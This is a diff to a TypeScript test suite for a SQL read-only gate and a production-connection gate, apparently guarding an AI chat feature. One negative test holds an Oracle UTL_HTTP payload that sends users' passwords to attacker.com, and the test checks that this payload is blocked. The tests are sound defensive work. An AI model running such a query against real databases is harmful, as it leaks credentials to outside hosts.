@@ -68,6 +68,7 @@ describe("buildSystem", () => {
 });
 
 describe("isReadOnlySql (MEDIUM-001 hardened gate)", () => {
+  // Positive cases — legitimate SELECTs must pass.
   test("accepts plain SELECT", () => {
     expect(isReadOnlySql("SELECT * FROM employees")).toBe(true);
   });
@@ -82,6 +83,8 @@ describe("isReadOnlySql (MEDIUM-001 hardened gate)", () => {
        SELECT id FROM x`
     )).toBe(true);
   });
+
+  // Reduced false-positives via tokenizer (these were blocked by the old gate).
   test("accepts SELECT with DML keyword inside string literal", () => {
     expect(isReadOnlySql(`SELECT * FROM tickets WHERE message LIKE '%insert into%'`)).toBe(true);
   });
@@ -91,6 +94,8 @@ describe("isReadOnlySql (MEDIUM-001 hardened gate)", () => {
   test("accepts SELECT with quoted identifier matching keyword", () => {
     expect(isReadOnlySql(`SELECT "DELETE" FROM my_table`)).toBe(true);
   });
+
+  // Negative cases — bypasses now blocked.
   test("blocks UTL_HTTP exfiltration", () => {
     expect(isReadOnlySql(
       `SELECT UTL_HTTP.REQUEST('http://attacker.com/?'||(SELECT password FROM users)) FROM dual`
@@ -108,6 +113,8 @@ describe("isReadOnlySql (MEDIUM-001 hardened gate)", () => {
   test("blocks LOCK TABLE", () => {
     expect(isReadOnlySql(`LOCK TABLE foo IN EXCLUSIVE MODE`)).toBe(false);
   });
+
+  // Existing protections remain.
   test("blocks INSERT", () => {
     expect(isReadOnlySql("INSERT INTO x VALUES (1)")).toBe(false);
   });
@@ -150,12 +157,16 @@ describe("aiChat (PROD-001 prod-connection gate)", () => {
     setSessionSafety({});
   });
 
+  // Helper: race aiChat against a short timeout. If the gate fires, aiChat
+  // throws -32604 synchronously; if the gate passes, we hit the 200ms timeout
+  // (sentinel code -1) and conclude the gate did NOT fire. This avoids
+  // depending on Anthropic SDK behavior in tests.
   async function callOrTimeout(params: any): Promise<any> {
     try {
       await Promise.race([
         aiChat(params),
         new Promise((_, reject) =>
-          setTimeout(() => reject({ code: -1, message: "passed-gate" }), 1000),
+          setTimeout(() => reject({ code: -1, message: "passed-gate" }), 200),
         ),
       ]);
       return null;
